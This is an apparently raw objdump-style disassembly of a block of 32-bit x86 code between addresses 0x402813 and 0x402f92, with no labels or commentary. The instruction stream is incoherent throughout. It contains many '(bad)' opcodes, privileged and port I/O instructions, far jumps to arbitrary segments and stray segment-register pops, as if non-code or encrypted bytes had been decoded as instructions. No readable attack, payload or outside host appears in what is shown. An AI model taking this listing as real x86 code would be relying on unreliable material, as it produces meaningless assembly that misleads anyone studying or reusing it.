  402813:	add    BYTE PTR [edx+edx*2],ch
  402816:	ficom  DWORD PTR [ecx+edi*4-0x6f8beef]
  40281d:	mov    bl,0x6a
  40281f:	add    eax,0x2c98e951
  402824:	mov    al,0xc3
  402826:	pop    ss
  402827:	ret    0x9416
  40282a:	int    0xd2
  40282c:	mov    WORD PTR [ebx+0x561ee2ab],fs
  402832:	xchg   ebp,eax
  402833:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402834:	push   edi
  402835:	bound  eax,QWORD PTR [edx+0x12]
  402838:	fisttp DWORD PTR [ebx]
  40283a:	repnz (bad) [eax]
  40283d:	gs push ecx
  40283f:	xchg   DWORD PTR [esi+0x27],ecx
  402842:	ds add al,0x3e
  402845:	add    BYTE PTR [ebx],cl
  402847:	xchg   BYTE PTR [eax+ebx*4],cl
  40284a:	mov    al,0x2a
  40284c:	pop    ss
  40284d:	pop    ecx
  40284e:	add    eax,0xf9da8d5c
  402853:	inc    esi
  402854:	fnsave [ecx-0x53]
  402857:	mov    ch,0xc1
  402859:	aam    0x9d
  40285b:	in     eax,dx
  40285c:	jecxz  0x40280b
  40285e:	loope  0x402888
  402860:	pop    ss
  402861:	mov    ds:0x622dec32,al
  402866:	push   edi
  402867:	clc    
  402868:	stc    
  402869:	fwait
  40286a:	sbb    DWORD PTR [esi+0x2f],edi
  40286d:	lods   eax,DWORD PTR ds:[esi]
  40286e:	sub    dl,0x65
  402871:	push   edx
  402872:	bound  edi,QWORD PTR [ebp-0x65ba8875]
  402878:	pop    edi
  402879:	mov    BYTE PTR [ecx-0x2b],al
  40287c:	aas    
  40287d:	dec    edx
  40287e:	mul    dh
  402880:	in     eax,0x8f
  402882:	xor    cl,ah
  402884:	jmp    0xf3d4:0x29a3f8a
  40288b:	mov    gs:0xc4e31d8d,eax
  402891:	sbb    ecx,DWORD PTR [ecx]
  402893:	fbstp  TBYTE PTR [ebp-0x5153f19b]
  402899:	call   0x13e4:0xc23d5ea
  4028a0:	test   BYTE PTR [ecx],ch
  4028a2:	scas   al,BYTE PTR es:[edi]
  4028a3:	nop
  4028a4:	pop    ss
  4028a5:	rol    ah,1
  4028a7:	push   ebp
  4028a8:	shl    ebx,0x46
  4028ab:	icebp  
  4028ac:	popf   
  4028ad:	xchg   bl,ah
  4028af:	retf   0x138
  4028b2:	mov    WORD PTR [edx-0x1f],cs
  4028b5:	aaa    
  4028b6:	xlat   BYTE PTR ds:[ebx]
  4028b7:	pop    ecx
  4028b8:	xor    DWORD PTR [edx-0x4b98391e],ebx
  4028be:	rol    ebx,0xbb
  4028c1:	ficom  DWORD PTR [eax]
  4028c3:	test   BYTE PTR [ebp+0x2e9fd74],dl
  4028c9:	shr    BYTE PTR [edx+0x2],0x7a
  4028cd:	das    
  4028ce:	jle    0x4028e3
  4028d0:	enter  0xa93c,0x8d
  4028d4:	in     al,dx
  4028d5:	jne    0x402863
  4028d7:	ds ss pop es
  4028da:	mov    ebp,0x9fde4d8c
  4028df:	and    bl,BYTE PTR [ecx+0x12]
  4028e2:	int    0xe1
  4028e4:	lods   eax,DWORD PTR ds:[esi]
  4028e5:	int3   
  4028e6:	or     DWORD PTR [eax],esi
  4028e8:	ficomp WORD PTR [ebx-0x56]
  4028eb:	and    dh,BYTE PTR [ebx+0x71c0fcd7]
  4028f1:	inc    esi
  4028f2:	or     dh,dh
  4028f4:	jbe    0x4028a9
  4028f6:	adc    eax,0x1a14dab6
  4028fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4028fc:	outs   dx,DWORD PTR ds:[esi]
  4028fd:	cmp    BYTE PTR [ebx],bh
  4028ff:	dec    edx
  402900:	sahf   
  402901:	leave  
  402902:	push   ds
  402903:	test   al,0xc8
  402905:	adc    dl,BYTE PTR [eax+0x7c]
  402908:	pop    esp
  402909:	hlt    
  40290a:	dec    edi
  40290b:	xor    eax,0x945c3198
  402910:	lds    ebp,FWORD PTR [ecx+0x1bd6194f]
  402916:	int3   
  402917:	ret    0xf65c
  40291a:	lea    edx,[ecx-0x7]
  40291d:	iret   
  40291e:	jae    0x40293e
  402920:	dec    ebx
  402921:	gs pop edi
  402923:	(bad)  
  402924:	dec    esi
  402925:	and    al,0x5e
  402927:	pop    esp
  402928:	sahf   
  402929:	mov    eax,0x95833067
  40292e:	mov    DWORD PTR [edx+0x4357d2ba],ecx
  402934:	and    eax,0x7018aecc
  402939:	out    0xe3,al
  40293b:	test   BYTE PTR [esi+0x12],0x20
  40293f:	xor    al,0x76
  402941:	mov    DWORD PTR [esi+0x3a],0xee92860b
  402948:	dec    esp
  402949:	out    0x44,eax
  40294b:	adc    ecx,ebx
  40294d:	mov    esp,0x956346dc
  402952:	fisub  DWORD PTR [ecx+0x33e09690]
  402958:	lods   eax,DWORD PTR ds:[esi]
  402959:	mov    bh,0x49
  40295b:	jbe    0x4029ab
  40295d:	xor    esi,DWORD PTR [ebx+eiz*1+0x20]
  402961:	jmp    0x563635ed
  402966:	imul   edx,esp,0x2cf2c03b
  40296c:	xor    ecx,ecx
  40296e:	ins    BYTE PTR es:[edi],dx
  40296f:	(bad)  
  402972:	jecxz  0x402961
  402974:	(bad)  
  402975:	or     eax,0x5922226e
  40297a:	dec    edi
  40297b:	shr    BYTE PTR [esi*4-0x3d161324],0xbb
  402983:	sbb    DWORD PTR [esi+esi*1-0x1e],eax
  402987:	push   0x7414c4c6
  40298c:	mov    ebx,DWORD PTR [esi+edi*4]
  40298f:	xor    cl,dl
  402991:	test   al,0xc5
  402993:	push   ss
  402994:	xor    BYTE PTR [ebp+0x16f9b25f],cl
  40299a:	hlt    
  40299b:	cmp    DWORD PTR [edx-0x31],ebx
  40299e:	outs   dx,DWORD PTR ds:[esi]
  40299f:	test   BYTE PTR [edi],0x73
  4029a2:	sub    DWORD PTR [eax],ebp
  4029a4:	test   ebx,eax
  4029a6:	mov    eax,0x7ac361e8
  4029ab:	mov    eax,esp
  4029ad:	pop    esi
  4029ae:	cmp    eax,DWORD PTR [ebp-0x6]
  4029b1:	xchg   ebp,eax
  4029b2:	ins    DWORD PTR es:[edi],dx
  4029b3:	or     al,0x50
  4029b5:	and    al,0x12
  4029b7:	or     BYTE PTR ds:0x395c770d,bh
  4029bd:	es aas 
  4029bf:	scas   eax,DWORD PTR es:[edi]
  4029c0:	inc    ebp
  4029c1:	xor    al,0x26
  4029c3:	sbb    al,0x9
  4029c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4029c6:	mov    ds:0x95dcbe04,eax
  4029cb:	popf   
  4029cc:	push   eax
  4029cd:	hlt    
  4029ce:	and    BYTE PTR [ebx+0x5a81afb0],0x6
  4029d5:	(bad)  
  4029d6:	lods   eax,DWORD PTR ds:[esi]
  4029d7:	js     0x402963
  4029d9:	and    BYTE PTR [eax],bl
  4029db:	imul   eax,DWORD PTR ss:[edi+0x16],0xffffffbe
  4029e0:	sub    DWORD PTR [edx-0x14dd19af],esi
  4029e6:	adc    eax,0x2246c243
  4029eb:	or     BYTE PTR [eax-0x1f],dl
  4029ee:	push   esp
  4029ef:	pusha  
  4029f0:	mov    al,ds:0x852f5e58
  4029f5:	and    al,0x17
  4029f7:	or     eax,0xea84bc19
  4029fc:	dec    ecx
  4029fd:	xor    ebp,DWORD PTR [ebx+esi*8-0x62]
  402a01:	xchg   edx,eax
  402a02:	idiv   DWORD PTR [edx+0xd]
  402a05:	mov    ch,0xb7
  402a07:	cmp    DWORD PTR [edi-0x3fbce19],0xe2071a70
  402a11:	xchg   ecx,eax
  402a12:	in     eax,dx
  402a13:	cmc    
  402a14:	mov    cl,dh
  402a16:	pop    ebx
  402a17:	into   
  402a18:	fninit 
  402a1a:	aaa    
  402a1b:	das    
  402a1c:	iret   
  402a1d:	mov    ds:0x6dd1387c,eax
  402a22:	jno    0x4029ca
  402a24:	loop   0x4029af
  402a26:	inc    esp
  402a27:	sub    ebx,esp
  402a29:	xor    al,0xea
  402a2b:	out    0x68,eax
  402a2d:	mov    edx,0x4d2df0b2
  402a32:	inc    esi
  402a33:	pop    ebp
  402a34:	add    BYTE PTR [ebx-0x68b3b06f],ah
  402a3a:	out    dx,al
  402a3b:	leave  
  402a3c:	out    dx,al
  402a3d:	jb     0x402aaf
  402a3f:	loopne 0x4029e3
  402a41:	adc    al,dl
  402a43:	xlat   BYTE PTR ds:[ebx]
  402a44:	jae    0x4029f5
  402a46:	lock jg 0x4029f5
  402a49:	sub    ah,dl
  402a4b:	inc    ecx
  402a4c:	in     al,0x92
  402a4e:	jp     0x402a20
  402a50:	mul    eax
  402a52:	xchg   ecx,eax
  402a53:	in     al,0xd1
  402a55:	pushf  
  402a56:	sub    ebx,DWORD PTR [edi]
  402a58:	jmp    0x2aee:0x6f96fe2b
  402a5f:	dec    ebx
  402a60:	adc    BYTE PTR [eax+0x69e78c3],dl
  402a66:	lds    edx,FWORD PTR [ebx]
  402a68:	out    dx,eax
  402a69:	cmp    al,0x3d
  402a6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402a6c:	add    DWORD PTR [edi-0x55],ebp
  402a6f:	and    eax,0xc802d573
  402a74:	pop    esp
  402a75:	stos   DWORD PTR es:[edi],eax
  402a76:	sbb    esi,DWORD PTR [ebx+0x72ebe305]
  402a7c:	sub    eax,0x17699390
  402a81:	xchg   DWORD PTR [edx],ecx
  402a83:	cmp    dh,BYTE PTR [ecx-0x4e]
  402a86:	push   ebp
  402a87:	fadd   QWORD PTR [edi-0x68]
  402a8a:	imul   esi
  402a8c:	test   BYTE PTR [eax+0x52],ch
  402a8f:	push   0x7c
  402a91:	or     edx,0x15
  402a94:	cmp    BYTE PTR [esp+eax*2+0x13d3ed71],0xc0
  402a9c:	jmp    0xac08d793
  402aa1:	push   ecx
  402aa2:	add    esi,DWORD PTR [ebx+0x5f]
  402aa5:	in     eax,0x31
  402aa7:	mov    dl,0xb5
  402aa9:	push   ebx
  402aaa:	dec    ebx
  402aab:	mov    esi,0x325802b7
  402ab0:	pop    ss
  402ab1:	cli    
  402ab2:	xor    eax,0x82c2c38
  402ab7:	stos   BYTE PTR es:[edi],al
  402ab8:	pop    edx
  402ab9:	jne    0x402aee
  402abb:	pop    ss
  402abc:	imul   edx,DWORD PTR [ecx-0x17c57698],0x1a
  402ac3:	cmp    al,0x65
  402ac5:	into   
  402ac6:	jmp    0x3841109b
  402acb:	and    esp,ecx
  402acd:	and    BYTE PTR [ebx],dl
  402acf:	mov    bl,0x99
  402ad1:	or     DWORD PTR ds:0xe96e5e2f,esi
  402ad7:	xchg   edx,eax
  402ad8:	mov    edx,0x52d9e2f8
  402add:	(bad)  
  402ade:	cmp    BYTE PTR [eax],al
  402ae0:	addr16 mov edi,0xadb69457
  402ae6:	rcl    DWORD PTR [ecx+0x19],1
  402ae9:	push   0x31
  402aeb:	mov    dl,0xb0
  402aed:	sahf   
  402aee:	jl     0x402b65
  402af0:	sti    
  402af1:	ja     0x402b35
  402af3:	cmp    al,0xbd
  402af5:	mov    dl,0x48
  402af7:	stos   DWORD PTR es:[edi],eax
  402af8:	add    ecx,DWORD PTR [ebp-0x7824da9b]
  402afe:	dec    edx
  402aff:	mov    ch,0x1a
  402b01:	call   0xb975:0x7703ac8e
  402b08:	dec    eax
  402b09:	(bad)  
  402b0b:	cmp    DWORD PTR [ecx-0x68],0x58
  402b0f:	sbb    eax,DWORD PTR [ebx+ecx*4+0x67a91918]
  402b16:	dec    ecx
  402b17:	xor    BYTE PTR [edx-0x4d868801],bh
  402b1d:	dec    edx
  402b1e:	add    BYTE PTR [eax-0x55],bl
  402b21:	sbb    eax,0x9aa7d11e
  402b26:	fs pop ebx
  402b28:	mov    esi,0x19bd2445
  402b2d:	jmp    FWORD PTR [edx-0x2791140e]
  402b33:	leave  
  402b34:	pop    ss
  402b35:	dec    edx
  402b36:	nop
  402b37:	shl    BYTE PTR [ecx+0x6983cdcd],cl
  402b3d:	jp     0x402b86
  402b3f:	cmc    
  402b40:	jmp    0xbb5e:0x2542c34a
  402b47:	inc    ebp
  402b48:	cmp    eax,0xb7eda90e
  402b4d:	xor    eax,0x80a98916
  402b52:	pop    es
  402b53:	xchg   esi,eax
  402b54:	add    eax,DWORD PTR [ebp-0x3b]
  402b57:	sar    BYTE PTR [eax],1
  402b59:	dec    esi
  402b5a:	out    dx,al
  402b5b:	pusha  
  402b5c:	sub    cl,BYTE PTR [esi+0x3073af75]
  402b62:	cli    
  402b63:	aas    
  402b64:	mov    dh,0x1b
  402b66:	adc    BYTE PTR [ebp+0x3c],ch
  402b69:	inc    edx
  402b6a:	xor    dl,BYTE PTR [ebx-0x28e442b2]
  402b70:	cwde   
  402b71:	aad    0x40
  402b73:	sub    dh,ah
  402b75:	push   eax
  402b76:	lods   al,BYTE PTR ds:[esi]
  402b77:	fisubr DWORD PTR [esi+0x11d2c8b3]
  402b7d:	test   al,0xc2
  402b7f:	xor    BYTE PTR [esi-0x407d841c],dl
  402b85:	xor    al,BYTE PTR [eax+0x1d]
  402b88:	gs sti 
  402b8a:	mov    cl,0x69
  402b8c:	hlt    
  402b8d:	xor    al,0x7d
  402b8f:	pop    ds
  402b90:	pop    ss
  402b91:	test   BYTE PTR [ecx-0x3dd26f86],ah
  402b97:	pop    esp
  402b98:	fwait
  402b99:	xchg   ch,bl
  402b9b:	ds mov ebp,0xd60cb44b
  402ba1:	loop   0x402b9e
  402ba3:	push   es
  402ba4:	sub    al,0x3b
  402ba6:	stos   BYTE PTR es:[edi],al
  402ba7:	aaa    
  402ba8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402ba9:	icebp  
  402baa:	outs   dx,BYTE PTR ds:[esi]
  402bab:	lods   al,BYTE PTR ds:[esi]
  402bac:	lahf   
  402bad:	cmp    ch,BYTE PTR [edi]
  402baf:	outs   dx,DWORD PTR ds:[esi]
  402bb0:	or     esi,DWORD PTR [esi-0x21]
  402bb3:	push   eax
  402bb5:	mov    edx,0xc5756b66
  402bba:	int    0xbc
  402bbc:	jb     0x402b83
  402bbe:	xchg   ebp,eax
  402bbf:	les    ebx,FWORD PTR [ebp-0xe531c4f]
  402bc5:	add    BYTE PTR [edi+0x7f65a482],0xc3
  402bcc:	add    ch,BYTE PTR [esi]
  402bce:	cdq    
  402bcf:	push   0x7bd0aa40
  402bd4:	fist   DWORD PTR [ebx]
  402bd6:	dec    ebp
  402bd7:	mov    edi,0x88503a8a
  402bdc:	test   eax,0x8a1bfb74
  402be1:	jle    0x402bf8
  402be3:	gs out dx,al
  402be5:	ret    0x4dcc
  402be8:	mov    BYTE PTR [esi+eax*2-0x56],bl
  402bec:	mov    eax,0x84bf1099
  402bf1:	cs cmp al,cl
  402bf4:	xchg   edi,eax
  402bf5:	inc    DWORD PTR [esi+0x1a]
  402bf8:	dec    esp
  402bf9:	jmp    0x41ebada9
  402bfe:	xchg   DWORD PTR [edx+esi*8],ecx
  402c01:	push   esi
  402c02:	(bad)  
  402c03:	jp     0x402c12
  402c05:	jp     0x402b8b
  402c07:	adc    al,cl
  402c09:	iret   
  402c0a:	std    
  402c0b:	rcl    DWORD PTR ds:0x7e0dccbc,1
  402c11:	xchg   ebp,eax
  402c12:	mov    ah,cl
  402c14:	push   eax
  402c15:	ret    
  402c16:	jo     0x402c40
  402c18:	popa   
  402c19:	(bad)  
  402c1a:	popa   
  402c1b:	div    DWORD PTR [eax]
  402c1d:	cdq    
  402c1e:	mov    edi,0xb82d749c
  402c23:	dec    edx
  402c24:	push   edi
  402c25:	mov    edx,0x50149f80
  402c2a:	mov    ds:0xbef87f37,eax
  402c2f:	cmc    
  402c30:	and    al,0x21
  402c32:	call   edx
  402c34:	cmc    
  402c35:	adc    eax,0x4fbfe5e
  402c3a:	ds sub esi,edi
  402c3d:	mov    ds:0x5202f619,al
  402c42:	dec    edx
  402c43:	shl    BYTE PTR [eax],0xa1
  402c46:	ins    DWORD PTR es:[edi],dx
  402c47:	push   0x6c0c717
  402c4c:	xchg   ebp,eax
  402c4d:	aad    0x63
  402c4f:	ds push esp
  402c51:	cmp    eax,0x8ea330e4
  402c56:	jmp    0x402bfa
  402c58:	sahf   
  402c59:	fisubr WORD PTR [edi]
  402c5b:	mov    bh,0xe5
  402c5d:	sbb    dh,dh
  402c5f:	sahf   
  402c60:	stos   BYTE PTR es:[edi],al
  402c61:	jmp    0x566a77b1
  402c66:	mov    bh,BYTE PTR [ecx]
  402c68:	loop   0x402c42
  402c6a:	cdq    
  402c6b:	cmp    ecx,DWORD PTR [edx-0x6ecf6478]
  402c71:	cmp    ah,bh
  402c73:	fldenv [ebx+0x69]
  402c76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402c77:	mov    al,0xb2
  402c79:	or     al,0xf0
  402c7b:	pop    edi
  402c7c:	mov    ebx,0x5f73d0b1
  402c81:	add    ch,BYTE PTR [edx+edi*8+0x44f0254e]
  402c88:	std    
  402c89:	xchg   BYTE PTR [ecx+0x43],ch
  402c8c:	cmp    DWORD PTR [ebp-0x7],eax
  402c8f:	stos   DWORD PTR es:[edi],eax
  402c90:	add    eax,0xee87319a
  402c95:	int3   
  402c96:	jp     0x402c1b
  402c98:	call   0xe277:0x2d8f4630
  402c9f:	mov    dh,0x9e
  402ca1:	mov    al,ds:0xb021279d
  402ca6:	popa   
  402ca7:	scas   eax,DWORD PTR es:[edi]
  402ca8:	mov    ecx,0x479d29ed
  402cad:	dec    edi
  402cae:	inc    eax
  402caf:	xchg   edi,eax
  402cb0:	cli    
  402cb1:	int3   
  402cb2:	test   eax,esp
  402cb4:	mov    al,ds:0xb28fa546
  402cb9:	xchg   DWORD PTR [eax],edx
  402cbb:	pusha  
  402cbc:	and    eax,0xff686774
  402cc1:	push   0x1
  402cc3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402cc4:	retf   
  402cc5:	(bad)  
  402cc6:	in     eax,dx
  402cc7:	in     al,0x63
  402cc9:	scas   al,BYTE PTR es:[edi]
  402cca:	fcom   st(0)
  402ccc:	pop    esp
  402ccd:	ret    0x497b
  402cd0:	repnz ins DWORD PTR es:[edi],dx
  402cd2:	aad    0xc8
  402cd4:	shl    BYTE PTR [esi],0x4d
  402cd7:	inc    esp
  402cd8:	cmc    
  402cd9:	mov    ah,0xf6
  402cdb:	outs   dx,BYTE PTR ds:[esi]
  402cdc:	mov    ah,0xf9
  402cde:	int3   
  402cdf:	jp     0x402d4e
  402ce1:	jp     0x402d44
  402ce3:	mov    bh,0xc5
  402ce5:	pop    ss
  402ce6:	aam    0x61
  402ce8:	sbb    ebx,ecx
  402cea:	inc    ebp
  402ceb:	mov    al,0x3c
  402ced:	mov    ah,0x0
  402cef:	call   DWORD PTR [edi-0x2a5da33d]
  402cf5:	mul    BYTE PTR [esi-0x5f]
  402cf8:	stos   BYTE PTR es:[edi],al
  402cf9:	(bad)  
  402cfa:	inc    ebx
  402cfb:	push   edx
  402cfc:	sbb    al,0x2d
  402cfe:	jecxz  0x402d7c
  402d00:	out    dx,eax
  402d01:	and    dh,BYTE PTR [eax+0x18]
  402d04:	xor    eax,0x64dca966
  402d09:	pop    esi
  402d0a:	leave  
  402d0b:	sub    ah,BYTE PTR [esi-0x31]
  402d0e:	addr16 js 0x402d7d
  402d11:	xchg   esi,eax
  402d12:	js     0x402d56
  402d14:	sub    DWORD PTR [edx+0x601ea750],ebp
  402d1a:	in     al,0x65
  402d1c:	mov    DWORD PTR [eax],ebx
  402d1e:	lods   al,BYTE PTR ds:[esi]
  402d1f:	aaa    
  402d20:	inc    esi
  402d21:	rcr    BYTE PTR [ecx-0xb009a39],cl
  402d27:	lea    esp,[edi+0x7d]
  402d2a:	add    al,0x41
  402d2c:	mov    bh,0x23
  402d2e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d2f:	mov    eax,0x9e3a5d03
  402d34:	inc    ebx
  402d35:	xlat   BYTE PTR ds:[ebx]
  402d36:	jge    0x402d8d
  402d38:	lds    edx,FWORD PTR ds:0xa72486e6
  402d3e:	inc    edi
  402d3f:	mov    ah,0x4
  402d41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402d42:	pop    ebx
  402d43:	test   al,0x88
  402d45:	and    bl,BYTE PTR [edi]
  402d47:	inc    ecx
  402d48:	lahf   
  402d49:	stc    
  402d4a:	shl    BYTE PTR [esp+edx*1+0x438cfaba],cl
  402d51:	sbb    ch,BYTE PTR [eax+0x47]
  402d54:	jne    0x402d1a
  402d56:	or     esi,DWORD PTR [ebx+0x74937fc8]
  402d5c:	or     BYTE PTR [esi],cl
  402d5e:	sar    DWORD PTR [ecx-0x22],1
  402d61:	jns    0x402dd9
  402d63:	lea    eax,[eax]
  402d65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402d66:	mov    ah,bh
  402d68:	jl     0x402d79
  402d6a:	loope  0x402ced
  402d6c:	sbb    BYTE PTR [edx+ecx*8],al
  402d6f:	out    0x91,eax
  402d71:	rol    BYTE PTR [ebx-0x13a0daad],0xb6
  402d78:	inc    ebx
  402d79:	das    
  402d7a:	mov    ebx,0x6e5a2f6f
  402d7f:	push   ss
  402d80:	mov    esi,0xc7a8c45d
  402d85:	and    ah,BYTE PTR [edx+0x7e6f8a16]
  402d8b:	out    0xe2,al
  402d8d:	sub    ch,ah
  402d8f:	jmp    0x3375fc7b
  402d94:	xor    ebx,DWORD PTR [eax]
  402d96:	shl    DWORD PTR [esi-0x7c6df3e1],1
  402d9c:	loope  0x402e1d
  402d9e:	jmp    0x402d5a
  402da0:	cmp    eax,0xbdfa25f6
  402da5:	sbb    edx,ebx
  402da7:	fidiv  WORD PTR [esi+0xc]
  402daa:	scas   eax,DWORD PTR es:[edi]
  402dab:	jne    0x402e1e
  402dad:	call   0x858fbdec
  402db2:	and    esp,DWORD PTR [eax]
  402db4:	cli    
  402db5:	add    ebp,DWORD PTR [edi-0x1da073]
  402dbb:	cwde   
  402dbc:	mov    bh,0x11
  402dbe:	or     BYTE PTR [esp+esi*1],cl
  402dc1:	sbb    esi,edi
  402dc3:	sbb    al,0x3a
  402dc5:	loopne 0x402d7f
  402dc7:	dec    edx
  402dc8:	rol    bl,0x92
  402dcb:	cmovne ebx,esp
  402dce:	add    eax,0xb20dbdca
  402dd3:	adc    eax,0x79c0ff5
  402dd8:	fs retf 
  402dda:	mov    edx,0x81608bd2
  402ddf:	ins    DWORD PTR es:[edi],dx
  402de0:	mov    ds,WORD PTR [edx+ebx*2+0x4a]
  402de4:	loop   0x402e0c
  402de6:	outs   dx,BYTE PTR ds:[esi]
  402de7:	or     BYTE PTR [edx],dl
  402de9:	mov    bl,0xb2
  402deb:	and    ah,0x30
  402dee:	ins    BYTE PTR es:[edi],dx
  402def:	in     eax,dx
  402df0:	pushf  
  402df1:	dec    eax
  402df2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402df3:	call   0x765a2376
  402df8:	out    0x9b,eax
  402dfa:	xchg   esp,eax
  402dfb:	xchg   DWORD PTR [esi-0x4],esi
  402dfe:	cs ss cs hlt 
  402e02:	popf   
  402e03:	rcr    BYTE PTR [esi-0x5e3ddf26],1
  402e09:	xchg   edi,eax
  402e0a:	clc    
  402e0b:	das    
  402e0c:	push   edx
  402e0d:	je     0x402e33
  402e0f:	pop    ebx
  402e10:	mov    al,0x2b
  402e12:	repz gs (bad) 
  402e15:	mov    edx,0x23152049
  402e1a:	in     al,0x2
  402e1c:	push   ebp
  402e1d:	pop    esi
  402e1e:	push   edx
  402e1f:	(bad)  
  402e20:	imul   BYTE PTR [eax+ebx*4-0x55]
  402e24:	mul    DWORD PTR [edx+esi*8]
  402e27:	repnz pop ds
  402e29:	inc    eax
  402e2a:	ret    0x2abc
  402e2d:	cwde   
  402e2e:	pop    ebp
  402e2f:	fwait
  402e30:	jo     0x402e57
  402e32:	xor    edi,DWORD PTR [eax]
  402e34:	mov    al,ds:0x5bdd5cb6
  402e39:	xchg   ebp,eax
  402e3a:	retf   
  402e3b:	bound  esi,QWORD PTR [eax+esi*1]
  402e3e:	(bad)  
  402e3f:	cmp    DWORD PTR [eax],edi
  402e41:	pop    esi
  402e42:	add    BYTE PTR [edi+0x760fa4db],cl
  402e48:	and    BYTE PTR [ebx+0x332a2c5a],ch
  402e4e:	inc    ecx
  402e4f:	mov    al,ds:0x31ba66d2
  402e54:	bound  edi,QWORD PTR [edi+0x7c]
  402e57:	(bad)
  402e5b:	xchg   edi,eax
  402e5c:	and    bl,BYTE PTR [edx-0x41]
  402e5f:	repnz mov eax,ds:0xd66bec01
  402e65:	dec    ebx
  402e66:	dec    ecx
  402e67:	mov    DWORD PTR [edi+0x7e],eax
  402e6a:	or     al,0xc1
  402e6c:	jle    0x402e95
  402e6e:	sti    
  402e6f:	mov    edi,DWORD PTR [esi+0x32]
  402e72:	icebp  
  402e73:	xchg   ebp,eax
  402e74:	cli    
  402e75:	push   0xf2bb0e28
  402e7a:	aaa    
  402e7b:	mov    ebx,0x57e9877
  402e80:	xor    ebp,DWORD PTR [edx]
  402e82:	push   ebx
  402e83:	pop    ds
  402e84:	lds    edx,FWORD PTR [ebp-0x72]
  402e87:	pop    edx
  402e88:	dec    esp
  402e89:	push   ds
  402e8a:	outs   dx,BYTE PTR ds:[esi]
  402e8b:	xor    bh,BYTE PTR ds:0x496e062d
  402e91:	xchg   ebx,eax
  402e92:	sub    dl,BYTE PTR [esi]
  402e94:	out    dx,al
  402e95:	stos   BYTE PTR es:[edi],al
  402e96:	jo     0x402e9c
  402e98:	xchg   ebp,eax
  402e99:	pop    eax
  402e9a:	jb     0x402e87
  402e9c:	dec    ecx
  402e9d:	xchg   DWORD PTR [ebp+0x30e79cdf],esi
  402ea3:	push   es
  402ea4:	pop    ebx
  402ea5:	fwait
  402ea6:	arpl   bp,sp
  402ea8:	mov    DWORD PTR [edi-0x49],0x5d3a1713
  402eaf:	wbinvd 
  402eb1:	add    al,bh
  402eb3:	std    
  402eb4:	data16 mov ch,0x9
  402eb7:	test   DWORD PTR [esi-0x23],eax
  402eba:	mov    al,0x1c
  402ebc:	push   edi
  402ebd:	sbb    al,0x81
  402ebf:	daa    
  402ec0:	add    al,0xbf
  402ec2:	bound  esi,QWORD PTR [eax]
  402ec4:	push   esi
  402ec5:	inc    eax
  402ec6:	int    0x60
  402ec8:	gs (bad) 
  402ecb:	add    esp,0xffffffff
  402ece:	test   al,0xf8
  402ed0:	pop    esi
  402ed1:	shr    BYTE PTR [esi],1
  402ed3:	or     ebx,DWORD PTR [eax-0x63]
  402ed6:	pushf  
  402ed7:	add    ebx,0xffffffbd
  402eda:	pop    ss
  402edb:	mov    esp,0x9eedf540
  402ee0:	push   es
  402ee1:	fwait
  402ee2:	in     al,dx
  402ee3:	dec    eax
  402ee4:	jnp    0x402f4d
  402ee6:	xlat   BYTE PTR ds:[ebx]
  402ee7:	cmp    edi,DWORD PTR [edx-0x4b1b8af1]
  402eed:	dec    eax
  402eee:	lock cwde 
  402ef0:	jg     0x402f33
  402ef2:	jnp    0x402ece
  402ef4:	and    eax,0x4c9a4aa5
  402ef9:	add    al,0x40
  402efb:	and    ch,BYTE PTR [ebx+0x76]
  402efe:	pop    ss
  402eff:	mov    ss,WORD PTR [edx-0x13]
  402f02:	or     al,dh
  402f04:	je     0x402ed4
  402f06:	retf   
  402f07:	into   
  402f08:	rol    BYTE PTR [esi],0xa1
  402f0b:	cs jl  0x402f1d
  402f0e:	fstp   TBYTE PTR [eax-0x1181e2a1]
  402f14:	mov    dh,0x3a
  402f16:	adc    DWORD PTR [esi+0x1827c78d],esi
  402f1c:	shl    BYTE PTR [ecx],0x14
  402f1f:	mov    bh,0x9a
  402f21:	xchg   ecx,eax
  402f22:	icebp  
  402f23:	add    edx,DWORD PTR [esi]
  402f25:	dec    esp
  402f26:	and    al,al
  402f28:	aaa    
  402f29:	cwde   
  402f2a:	inc    edi
  402f2b:	sbb    dl,BYTE PTR [ebx-0x554c2b50]
  402f31:	jp     0x402f2e
  402f33:	pop    esi
  402f34:	shl    BYTE PTR [eax-0x1e7903e3],1
  402f3a:	mov    dh,0xa4
  402f3c:	xchg   ecx,eax
  402f3d:	out    dx,eax
  402f3e:	mov    al,BYTE PTR [edi+0x7d]
  402f41:	mov    ds:0x6f79bb0a,al
  402f46:	outs   dx,BYTE PTR ds:[esi]
  402f47:	ds mov ecx,0x45f80127
  402f4d:	xchg   ecx,eax
  402f4e:	in     eax,dx
  402f4f:	xor    DWORD PTR [ebp+ebx*8+0x62],0x2b
  402f54:	jae    0x402f2b
  402f56:	fwait
  402f57:	mov    al,0x2
  402f59:	xor    dl,ch
  402f5b:	loopne 0x402f9d
  402f5d:	xor    ebx,DWORD PTR [edx+0xa]
  402f60:	mov    esi,0x3f845a3b
  402f65:	fucomi st,st(2)
  402f67:	inc    edx
  402f68:	add    al,0xe0
  402f6a:	je     0x402f84
  402f6c:	pop    edi
  402f6d:	pushf  
  402f6e:	mov    al,0xa7
  402f70:	pop    esp
  402f71:	jle    0x402f58
  402f73:	icebp  
  402f74:	shl    BYTE PTR [ebx-0x5ad1beb1],cl
  402f7a:	inc    edi
  402f7b:	les    ebx,FWORD PTR ss:[edi+0x19]
  402f7f:	stos   BYTE PTR es:[edi],al
  402f80:	ss into 
  402f82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402f83:	cmp    BYTE PTR [edx-0x2],ah
  402f86:	into   
  402f87:	dec    ebp
  402f88:	cld    
  402f89:	inc    esi
  402f8a:	xlat   BYTE PTR ds:[ebx]
  402f8b:	fld    TBYTE PTR [eax]
  402f8d:	jne    0x403000
  402f8f:	add    DWORD PTR [ebx],edx
  402f91:	(bad)  
  402f92:	out    dx,eax
